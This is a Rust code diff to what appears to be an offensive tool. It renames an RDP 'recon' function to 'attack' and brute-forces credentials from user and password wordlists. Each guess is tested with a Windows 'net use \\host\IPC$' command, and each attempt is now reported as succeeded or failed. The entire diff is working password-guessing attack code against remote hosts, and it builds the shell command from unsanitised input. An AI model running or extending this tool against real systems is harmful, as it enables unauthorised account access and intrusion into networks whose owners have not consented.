@@ -10,7 +10,7 @@ pub struct RdpCredential {
     pub password: String,
 }
 
-pub fn recon(host: String, _users: Option<Vec<String>>, _passwords: Option<Vec<String>>) {
+pub fn attack(host: String, _users: Option<Vec<String>>, _passwords: Option<Vec<String>>) {
     let users = _users.unwrap_or(wordlists::get_users(None, false));
     let passwords: Vec<String> = _passwords.unwrap_or(wordlists::get_passwords(None, false));
 
@@ -28,33 +28,50 @@ pub fn recon(host: String, _users: Option<Vec<String>>, _passwords: Option<Vec<S
             }
         }
 
-        for _cred in creds.iter() {
-            println!(
-                "[RDP] Bruteforce Attack | host: {} | username: {} | password: {}",
-                _cred.host,
-                _cred.username,
-                _cred.password
-            );
-            connect(&_cred.host, &_cred.username, &_cred.password);
-        }
+        creds
+            .iter()
+            .map(|c| {
+                print!(
+                    "[RDP] Bruteforce Attack | host: {} | username: {} | password: {}",
+                    c.host, c.username, c.password
+                );
+
+                let _res = connect(&c.host, &c.username, &c.password);
+                if _res {
+                    println!("-> Success\n");
+                } else {
+                    println!("-> Failed\n");
+                }
+            })
+            .collect()
     }
 }
 
 #[cfg(target_os = "windows")]
-fn connect(host: &str, username: &str, password: &str) {
+fn connect(host: &str, username: &str, password: &str) -> bool {
     // Run `net use` command to check login credentials
+
+    use std::process::Stdio;
     let output = Command::new("cmd")
-        .args(&["/C", &format!("net use \\\\{}\\IPC$ /user:{} {}", host, username, password)])
-        .output()
-        .expect("Failed to execute command");
+        .args(&[
+            "/C",
+            &format!("net use \\\\{}\\IPC$ /user:{} {}", host, username, password),
+        ])
+        .stdout(Stdio::piped()) // Capture standard output
+        .stderr(Stdio::piped()) // Capture standard error
+        .output();
 
-    // Convert command output to string
-    let result = String::from_utf8_lossy(&output.stdout);
-    let error_result = String::from_utf8_lossy(&output.stderr);
-
-    if result.contains("successfully") {
-        println!("Login successful!");
-    } else {
-        println!("Login failed: {}", error_result);
+    match output {
+        Ok(output) => {
+            if output.status.success() {
+                String::from_utf8_lossy(&output.stdout)
+                    .trim()
+                    .to_string()
+                    .contains("success")
+            } else {
+                false
+            }
+        }
+        Err(_) => false,
     }
 }
